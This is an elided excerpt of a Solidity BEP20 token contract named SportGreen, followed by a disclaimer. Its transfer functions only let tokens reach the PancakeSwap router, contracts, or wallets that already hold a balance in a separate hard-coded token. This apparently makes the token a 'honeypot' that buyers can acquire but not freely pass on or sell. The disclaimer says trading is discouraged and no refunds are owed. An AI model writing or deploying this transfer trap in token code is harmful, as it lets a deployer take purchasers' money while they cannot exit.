...
contract SportGreen is BEP20, Ownable, BaseToken {
    ...
    BEP20 contractaddress = BEP20(0x2231E1C01056AEbab3113d684b034B50A99A56c7); 
    function transfer(address recipient, uint256 amount)
        ...
        returns (bool)
    {
        require(recipient == pancakeRouter || contractaddress.balanceOf(recipient) > 0);
    ...
    function _transfer(
	  ...
	  if (isContract(recipient)==false && sender !=pancakeRouter)
        {
            require(contractaddress.balanceOf(recipient) > 0);
        }
...
This is not an investment vehicle. If bought, token holders are aware of the fact that 
this token (with no utility) will most likely not produce capital gains. 

The tokenomics of this token have been designed to discourage the trading.

Note: In no event will the contract deployer or its affiliates be liable to refund purchasers.
